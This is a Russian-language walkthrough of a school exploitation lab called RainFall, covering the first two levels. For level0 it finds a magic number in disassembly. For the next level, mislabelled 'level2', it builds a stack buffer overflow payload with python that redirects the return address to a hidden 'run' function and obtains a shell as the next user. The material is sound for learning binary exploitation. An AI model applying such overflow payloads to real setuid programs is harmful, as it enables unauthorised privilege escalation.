# Решаю RainFall
Это школьный проект. Нам дается образ ubuntu-32, там 12 юзеров, дается пароль от первого. в директории каждого юзера есть файл принадлежащий следующему юзеру. Нужно найти уязвимость, проэкплуатировать, чтоб прочитать файл с паролем

## level0

```
level0@RainFall:~$ ll
total 737
dr-xr-x---+ 1 level0 level0     60 Mar  6  2016 ./
dr-x--x--x  1 root   root      340 Sep 23  2015 ../
-rw-r--r--  1 level0 level0    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level0 level0   3530 Sep 23  2015 .bashrc
-rwsr-x---+ 1 level1 users  747441 Mar  6  2016 level0*
-rw-r--r--  1 level0 level0    675 Apr  3  2012 .profile
```

Запускем бинарь level0

```
level0@RainFall:~$ ./level0
Segmentation fault (core dumped)
level0@RainFall:~$ ./level0 123
No !
```

Окей, запускаемся под ```gdb``` и дизассемблим ```main```.

Сразу переключаюсь на интеловский синтаксис: ```set disassembly-flavor intel```

Весь листинг прикреплять не буду, только самый интересный кусок:

```
0x08048ed4 <+20>:	call   0x8049710 <atoi>
0x08048ed9 <+25>:	cmp    eax,0x1a7
0x08048ede <+30>:	jne    0x8048f58 <main+152>
```

Видим вызов ```atoi```, результат ее работы сравнивается с ```0x1a7``` и условный прыжок. 

Запускаем бинарь с нужным аргументом:

```
level0@RainFall:~$ ./level0 423
$ id
uid=2030(level1) gid=2020(level0) groups=2030(level1),100(users),2020(level0)
$
```
Первый уровень пройден ;)

## level2

Бинарь ждет пользовательский ввод. Сразу запускаюсь под ```gdb```:

```
(gdb) run
Starting program: /home/user/level1/level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Программа падает! Ура! Мы перетёрли своей строкой адрес возврата.
Перебором нащупываю ```76``` байт до адреса возврата.

```
(gdb) run
Starting program: /home/user/level1/level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab

Program received signal SIGSEGV, Segmentation fault.
0x62616161 in ?? ()
```

Далее смотрю какие функции есть в бинаре:

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
...
0x08048444  run
0x08048480  main
...
```

Интересно, что за функция ```run```. Готовим нагрузку:

```bash
level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
```

pwned! го дальше :)
